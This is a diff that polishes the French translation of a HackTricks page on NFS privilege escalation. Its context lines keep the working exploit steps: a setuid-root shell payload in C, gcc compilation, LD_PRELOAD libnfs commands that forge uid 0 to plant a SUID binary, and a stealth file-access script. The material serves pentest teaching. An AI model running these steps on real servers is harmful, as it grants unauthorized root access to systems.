@@ -44,7 +44,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-* **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté notre charge utile compilée qui abusent de la permission SUID, lui donner des droits **SUID**, et **exécuter depuis la machine victime** ce binaire (vous pouvez trouver ici quelques [charges utiles C SUID](payloads-to-execute.md#c)).
+* **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté notre charge utile compilée qui abusent des permissions SUID, lui donner des droits **SUID**, et **exécuter depuis la machine victime** ce binaire (vous pouvez trouver ici quelques [charges utiles C SUID](payloads-to-execute.md#c)).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -62,7 +62,7 @@ cd <SHAREDD_FOLDER>
 
 {% hint style="info" %}
 Notez que si vous pouvez créer un **tunnel de votre machine à la machine victime, vous pouvez toujours utiliser la version distante pour exploiter cette élévation de privilèges en tunnelant les ports requis**.\
-Le truc suivant est dans le cas où le fichier `/etc/exports` **indique une IP**. Dans ce cas, vous **ne pourrez pas utiliser** en aucun cas l'**exploit distant** et vous devrez **abuser de ce truc**.\
+Le truc suivant est au cas où le fichier `/etc/exports` **indique une IP**. Dans ce cas, vous **ne pourrez pas utiliser** en aucun cas l'**exploit distant** et vous devrez **abuser de ce truc**.\
 Une autre exigence nécessaire pour que l'exploit fonctionne est que **l'exportation à l'intérieur de `/etc/export`** **doit utiliser le drapeau `insecure`**.\
 \--_Je ne suis pas sûr que si `/etc/export` indique une adresse IP, ce truc fonctionnera_--
 {% endhint %}
@@ -82,7 +82,7 @@ gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib
 ```
 ### Réalisation de l'Exploitation
 
-L'exploitation consiste à créer un simple programme C (`pwn.c`) qui élève les privilèges à root et exécute ensuite un shell. Le programme est compilé, et le binaire résultant (`a.out`) est placé sur le partage avec suid root, en utilisant `ld_nfs.so` pour falsifier le uid dans les appels RPC :
+L'exploitation consiste à créer un simple programme C (`pwn.c`) qui élève les privilèges à root et exécute ensuite un shell. Le programme est compilé, et le binaire résultant (`a.out`) est placé sur le partage avec suid root, en utilisant `ld_nfs.so` pour falsifier l'uid dans les appels RPC :
 
 1. **Compiler le code d'exploitation :**
 ```bash
@@ -91,7 +91,7 @@ int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
 gcc pwn.c -o a.out
 ```
 
-2. **Placer l'exploitation sur le partage et modifier ses permissions en falsifiant le uid :**
+2. **Placer l'exploitation sur le partage et modifier ses permissions en falsifiant l'uid :**
 ```bash
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
 LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
@@ -106,7 +106,7 @@ LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs:/
 ```
 
 ## Bonus : NFShell pour un Accès Furtif aux Fichiers
-Une fois l'accès root obtenu, pour interagir avec le partage NFS sans changer de propriétaire (pour éviter de laisser des traces), un script Python (nfsh.py) est utilisé. Ce script ajuste le uid pour correspondre à celui du fichier accédé, permettant d'interagir avec les fichiers sur le partage sans problèmes de permission :
+Une fois l'accès root obtenu, pour interagir avec le partage NFS sans changer de propriétaire (pour éviter de laisser des traces), un script Python (nfsh.py) est utilisé. Ce script ajuste l'uid pour correspondre à celui du fichier accédé, permettant d'interagir avec des fichiers sur le partage sans problèmes de permission :
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -131,8 +131,8 @@ Exécuter comme :
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
 {% hint style="success" %}
-Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
